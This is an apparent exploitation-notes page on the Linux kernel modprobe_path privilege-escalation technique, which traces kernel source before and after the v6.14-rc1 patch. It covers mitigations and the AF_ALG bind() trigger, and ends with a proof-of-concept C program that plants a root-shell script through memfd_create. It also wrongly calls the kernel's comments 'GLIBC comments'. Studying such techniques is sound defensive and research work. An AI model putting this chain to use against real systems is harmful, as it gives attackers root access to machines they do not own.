---
tags:
  - pwn/technique
  - pwn/kernel
  - pwn/priv-esc
  - pwn/patch/v6-14-rc1
---
# Description
`modprobe_path` is a technique used to gain local privilege escalation when exploiting the kernel. It leverages the behavior of the Linux kernel when loading a module and the `modprobe` program, an executable in userspace located at `/usr/bin/modprobe`, to execute a user-controlled program as root, by overwriting `modprobe_path`. It was [patched](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) in the Linux kernel v6.14-rc1. There is a [newer technique](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch) post-patch to exploit `modprobe_path`, though.
# Attack (pre v6.14-rc1)
## Prerequisites
- Arbitrary write primitive
- Address of `modprobe_path` (requires leak if [[KASLR]] is enabled)
## Result
- Local privilege escalation (**LPE**)
## Analysis
We will consider the process of a userspace program calling [execve](https://man7.org/linux/man-pages/man2/execve.2.html). (Linux kernel v5.18.5). `execve()` eventually uses an `execve` [[syscall]] to throw an interrupt and transfer control flow to the kernel
```c
SYSCALL_DEFINE3(
	execve,
	const char __user * filename,
	const char __user *const __user * argv,
	const char __user *const __user * envp)
{
	return do_execve(getname(filename), argv, envp);
}
```
Several function calls later, we arrive at the kernel function [`search_binary_handler()`](https://elixir.bootlin.com/linux/v5.18.5/source/fs/exec.c#L1702). Here's the backtrace of functions so far:
```c
search_binary_handler(struct linux_binprm *bprm)  // current
exec_binrpm(...)
bprm_execve(...)
do_execveat_common(...)
do_execve(...)
SYSCALL_DEFINE3(execve, ...)
syscall execve  // userspace syscall
```
`search_binary_handler(struct linux_binrpm *bprm)` essentially looks for a binary format handler (`struct linux_binfmt`) in the doubly-linked list [`formats`](https://elixir.bootlin.com/linux/v5.18.5/source/fs/exec.c#L82). Note that `linux_binrpm` represents a binary parameter structure that "holds arguments that are used when loading binaries." ([here](https://elixir.bootlin.com/linux/v5.18.5/source/include/linux/binfmts.h#L18)). In this case, the binary being loaded is the file passed in the `filename` parameter for the `execve` syscall.
```c
/*
 * cycle the list of binary formats handler, until one recognizes the image
 */
static int search_binary_handler(struct linux_binrpm *bprm) {
	...
	read_lock(&binfmt_lock);
	list_for_each_entry(fmt, &formats, lh) {
		if (!try_module_get(fmt->module))
			continue;
		read_unlock(&binfmt_lock);
		
		retval = fmt->load_binary(bprm);
		
		read_lock(&binfmt_lock);
		put_binfmt(fmt);
		if (bprm->point_of_no_return || (retval != -ENOEXEC)) {
			read_unlock(&binfmt_lock);
			return retval;
		}
	}
	...
}
```
Essentially, `list_for_each_entry(fmt, &formats, lh)` iterates through `formats`, and tests if the `load_binary(bprm)` call (different implementations between formats) is valid for our `bprm`. That is, this will check if `load_binary` can process `bprm->buf`, which contains the first [<abbr title="256">BINPRM_BUF_SIZE</abbr>](https://elixir.bootlin.com/linux/v5.18.5/source/include/uapi/linux/binfmts.h#L19) bytes of our binary ([here](https://elixir.bootlin.com/linux/v5.18.5/source/include/linux/binfmts.h#L67)).
However, if no binary format handler works for our `bprm`, we hit this block later in the function:
```c
#define printable(c) (((c)=='\t') || ((c)=='\n') || (0x20<=(c) && (c)<=0x7e))
/*
 * cycle the list of binary formats handler, until one recognizes the image
 */
static int search_binary_handler(struct linux_binrpm *bprm) {
	...
	if (need_retry) {
		if (printable(bprm->buf[0]) && printable(bprm->buf[1]) && printable(bprm->buf[2]) && printable(bprm->buf[3]))
			return retval;
		if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
			return retval;
		need_retry = false;
		goto retry;
	}
	...
}
```
Most notably, if at least one of the first four bytes of  `brpm->buf` (our binary) is non-printable, then the kernel will, instead of returning, attempt to call `request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)`. `request_module` is a [macro](https://elixir.bootlin.com/linux/v5.18.5/source/include/linux/kmod.h#L25) for [`__request_module`](https://elixir.bootlin.com/linux/v5.18.5/source/kernel/kmod.c#L124)) such that it will attempt to load a kernel module and wait for the operation to complete. Specifically, it tries to "load a module using the user mode module loader." ;)
```c
#define request_module(mod...) __request_module(true, mod)

/**
 * __request_module - try to load a kernel module
 * @wait: wait (or not) for the operation to complete
 * @fmt: printf style format string for the name of the module
 * @...: arguments as specified in the format string
 * *
 * Load a module using the user mode module loader. The function returns zero on success or a negative errno code or positive exit code from "modprobe" on failure. Note that a successful module load does not mean the module did not then unload and exit on an error of its own. Callers must check that the service they requested is now available not blindly invoke it.
 * If module auto-loading support is disabled then this function simply returns -ENOENT.
 */
 int __request_module(bool wait, const char *fmt, ...)
 {
	if (!modprobe_path[0])
		 return -ENOENT;
	...
	// some checks about module name length, concurrency
	...
	ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
	...
	return ret
 }
```
Here, the kernel first checks if [`modprobe_path`](https://elixir.bootlin.com/linux/v5.18.5/source/include/linux/ kmod.h#L20) is defined or not. As stated in the function description, this is undefined when "module auto-loading support is disabled." Typically, `modprobe_path` is set to `/usr/bin/modprobe`. After some other miscellaneous checks, it calls [`call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC)`](https://elixir.bootlin.com/linux/v5.18.5/source/kernel/kmod.c#L69). Here's the whole function:
```c
static int call_modprobe(char *module_name, int wait)
{
	struct subprocess_info *info;
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};

	char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
	if (!argv)
		goto out;

	module_name = kstrdup(module_name, GFP_KERNEL);
	if (!module_name)
		goto free_argv;

	argv[0] = modprobe_path;
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;	/* check free_modprobe_argv() */
	argv[4] = NULL;

	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
	if (!info)
		goto free_module_name;

	return call_usermodehelper_exec(info, wait | UMH_KILLABLE);

free_module_name:
	kfree(module_name);
free_argv:
	kfree(argv);
out:
	return -ENOMEM;
}
```
After allocating space for `argv` and duplicating `module_name` to a new allocation, we see something very interesting: a command being constructed in `argv`:
```c
	argv[0] = modprobe_path;
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;	/* check free_modprobe_argv() */
	argv[4] = NULL;
```
In other words, it's creating the following command:
```bash
$ /usr/bin/modprobe -q -- binfmt-b0bacafe
```
Where `b0 ba ca fe` would be the first 4 bytes of our binary in hex.

Critically, the call to [`call_usermodehelper_setup()`](https://elixir.bootlin.com/linux/v5.18.5/source/kernel/umh.c#L358) and subsequently [`call_usermodehelper_exec()`](https://elixir.bootlin.com/linux/v5.18.5/source/kernel/umh.c#L404), according to the GLIBC comments:

> Runs a user-space application. The application is started asynchronously if wait is not set, and runs as a child of system workqueues.
> (ie. it runs with **full root capabilities** and optimized affinity).

Yup. This will run the command as **root**.

What does this tell us? Well, this means that if an unprivileged user can gain control of an *arbitrary write primitive* and knows where `modprobe_path` is in memory, they can overwrite `modprobe_path` with a path to their own, user-controlled binary. Then, by attempting to call `execve()` on a binary whose first 4 bytes are not handled by any known binary handler (e.g. `b0 ba ca fe`), the kernel will execute the user-controlled binary with root privileges. Yay!
## Examples
- [CVE-2022-27666](https://etenal.me/archives/1825) (`Etenal7`)
- [CVE-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html) (`Crusaders of Rust`)
- [Blog](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) (`_lkmidas`)
## Mitigations
### CONFIG_STATIC_USERMODEHELPER
[`CONFIG_STATIC_USERMODEHELPER`](https://cateee.net/lkddb/web-lkddb/STATIC_USERMODEHELPER.html) was introduced in 4.11, and makes `modprobe_path` read-only, thereby preventing arbitrary privileged execution.
### search_binary_handler() patch
This [patch](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) that released with **v6.14-rc1** cleaned up the deprecated functionality in `search_binary_handler()`. Specifically, it removed the call to `request_module()`, thereby preventing `call_modprobe` from being reached through the execution path of `execve() -> search_binary_handler()`.
```diff
@@ -1760,17 +1756,7 @@ static int search_binary_handler(struct linux_binprm *bprm)
        }
        read_unlock(&binfmt_lock);
        // [4]
-       if (need_retry) {
-               if (printable(bprm->buf[0]) && printable(bprm->buf[1]) &&
-                   printable(bprm->buf[2]) && printable(bprm->buf[3]))
-                       return retval;
-               if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
-                       return retval;
-               need_retry = false;
-               goto retry;
-       }
-
-       return retval;
+       return -ENOEXEC;
 }

 /* binfmt handlers will call back into begin_new_exec() on success. */
```
# Attack (post v6.14-rc1)
## Prerequisites (same)
- Arbitrary write primitive
- Address of `modprobe_path` (requires leak if [[KASLR]] is enabled)
## Result (same)
- Local privilege escalation (**LPE**)
## Analysis
Note: this analysis is based on **v6.15.4** of the Linux kernel.
After the [[#searchbinaryhandler() patch|patch]], we can no longer invoke `request_module()` through calling `execve()` on a file. However, there are other execution paths that call `request_module()`. We will consider the execution path proposed in \[2\]: using `AF_ALG` sockets.

[`AF_ALG`](https://elixir.bootlin.com/linux/v6.15.4/source/include/linux/socket.h#L230) sockets provide userspace access to the kernel crypto API. The associated code for these sockets can mostly be found [here](https://elixir.bootlin.com/linux/v6.15.4/source/crypto/af_alg.c#L1322).

[`alg_proto_ops`](https://elixir.bootlin.com/linux/v6.15.4/source/crypto/af_alg.c#L478) provides us the list of userspace-accessible functions:
```c
static const struct proto_ops alg_proto_ops = {
	.family		=	PF_ALG,
	.owner		=	THIS_MODULE,

	.connect	=	sock_no_connect,
	.socketpair	=	sock_no_socketpair,
	.getname	=	sock_no_getname,
	.ioctl		=	sock_no_ioctl,
	.listen		=	sock_no_listen,
	.shutdown	=	sock_no_shutdown,
	.mmap		=	sock_no_mmap,
	.sendmsg	=	sock_no_sendmsg,
	.recvmsg	=	sock_no_recvmsg,

	.bind		=	alg_bind,
	.release	=	af_alg_release,
	.setsockopt	=	alg_setsockopt,
	.accept		=	alg_accept,
};
```
But we mainly care about [`alg_bind()`](https://elixir.bootlin.com/linux/v6.15.4/source/crypto/af_alg.c)
```c
static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
{
	const u32 allowed = CRYPTO_ALG_KERN_DRIVER_ONLY;
	struct sock *sk = sock->sk;
	struct alg_sock *ask = alg_sk(sk);
	struct sockaddr_alg_new *sa = (void *)uaddr;
	const struct af_alg_type *type;
	void *private;
	int err;

	if (sock->state == SS_CONNECTED)
		return -EINVAL;

	BUILD_BUG_ON(offsetof(struct sockaddr_alg_new, salg_name) !=
		     offsetof(struct sockaddr_alg, salg_name));
	BUILD_BUG_ON(offsetof(struct sockaddr_alg, salg_name) != sizeof(*sa));

	if (addr_len < sizeof(*sa) + 1)
		return -EINVAL;

	/* If caller uses non-allowed flag, return error. */
	if ((sa->salg_feat & ~allowed) || (sa->salg_mask & ~allowed))
		return -EINVAL;

	sa->salg_type[sizeof(sa->salg_type) - 1] = 0;
	sa->salg_name[addr_len - sizeof(*sa) - 1] = 0;

	type = alg_get_type(sa->salg_type);
	if (PTR_ERR(type) == -ENOENT) {
		request_module("algif-%s", sa->salg_type);
		type = alg_get_type(sa->salg_type);
	}

	...

	return err;
}
```
As you may notice,  after a series of checks, `alg_bind()` eventually may call `request_module()`. The only check of significant interest is the [`alg_get_type(sa->salg_type)`](https://elixir.bootlin.com/linux/v6.15.4/source/crypto/af_alg.c#L43) call. Note that `sa->salg_type` is user-controlled since we can directly call [`bind()`](https://man7.org/linux/man-pages/man2/bind.2.html) on our `AF_ALG` socket in userspace (which will become `alg_bind` due to `alg_proto_ops`), and `sa = uaddr` is just a pointer to the `sockaddr` struct we pass into `bind`.
```c
struct alg_type_list {
	const struct af_alg_type *type;
	struct list_head list;
};

...

static LIST_HEAD(alg_types);
static DECLARE_RWSEM(alg_types_sem);

static const struct af_alg_type *alg_get_type(const char *name)
{
	const struct af_alg_type *type = ERR_PTR(-ENOENT);
	struct alg_type_list *node;

	down_read(&alg_types_sem);
	list_for_each_entry(node, &alg_types, list) {
		if (strcmp(node->type->name, name))
			continue;

		if (try_module_get(node->type->owner))
			type = node->type;
		break;
	}
	up_read(&alg_types_sem);

	return type;
}
```
Essentially, `alg_get_type()`:
1. Locks the `alg_types_sem` read/write semaphore (i.e., lock for parallelism)
2. Iterates through `alg_types` and...
	1. Looks for a matching [`af_alg_type`](https://elixir.bootlin.com/linux/v6.15.4/source/include/crypto/if_alg.h#L43) struct such that its name is equal to `name`, our user-controlled string.
	2. If the names match, it will attempt to retrieve the module for this node.
3. At the end, it will unlock the read/write semaphore and return `type`, which is set to `ENOENT` if no matching `af_alg_type` struct was found.

This is very familiar to the logic in `search_binary_handler()`! Just like before, we are looking for a module (binary loader) that corresponds to our object. And here, that requires the name of the cryptographic type of our socket (`sa->salg_type`) match one of the names of the kernel's defined cryptographic types. Thus, if we simply set the `salg_type` of our `sockaddr` struct to some nonsense prior to calling `bind()` on our socket, we'll successfully cause the kernel to call `request_module()`!
### memfd_create(): fileless execution
We can actually further this technique to be entirely fileless (as in, does not require using any files besides the original exploit file) by leveraging [`memfd_create()`](https://man7.org/linux/man-pages/man2/memfd_create.2.html) in a method developed by `lau` \[4\]. The idea is that `memfd_create()` actually writes to `/proc/<pid>/fd/<retval of memfd_create()>`, i.e. a file descriptor of the current process. So, we can write a script to pop a root shell as this process file descriptor, and then overwrite `modprobe_path` to `/proc/<pid>/fd/<retval of memfd_create()>`, and achieve execution without any other files! (The only "other file" used is a file descriptor of the current process).

Note that `lau` also brute forces the PID, which is necessary for kernelCTF since execution occurs in a [`mount namespace`](https://man7.org/linux/man-pages/man7/mount_namespaces.7.html). This is not necessary for normal circumstances.
### Proof of Concept
Courtesy of \[2\]:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <fcntl.h>
#include <sys/mman.h>

#define MODPROBE_SCRIPT "#!/bin/sh\\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\\n"

int main(void)
{
        char fake_modprobe[40] = {0};
        struct sockaddr_alg sa;
        pid_t pid = getpid();

        int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
        int shell_stdin_fd = dup(STDIN_FILENO);
        int shell_stdout_fd = dup(STDOUT_FILENO);

        dprintf(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd);
        snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid, modprobe_script_fd);

        // Overwriting modprobe_path with fake_modprobe here...

        int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (alg_fd < 0) {
                perror("socket(AF_ALG) failed");
                return 1;
        }

        memset(&sa, 0, sizeof(sa));
        sa.salg_family = AF_ALG;
        strcpy((char *)sa.salg_type, "V4bel");  // dummy string
        bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

        return 0;
}
```
# References
1. [pre v6.14-rc1](https://sam4k.com/like-techniques-modprobe_path/) (a lot of paraphrasing from here)
2. [post v6.14-rc1](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch) 
3. [Kernel Crypto API: Userspace Access](https://www.kernel.org/doc/html/v4.10/crypto/userspace-if.html)
4. [Flipping Pages](https://pwning.tech/nftables/#514-overwriting-modprobepath)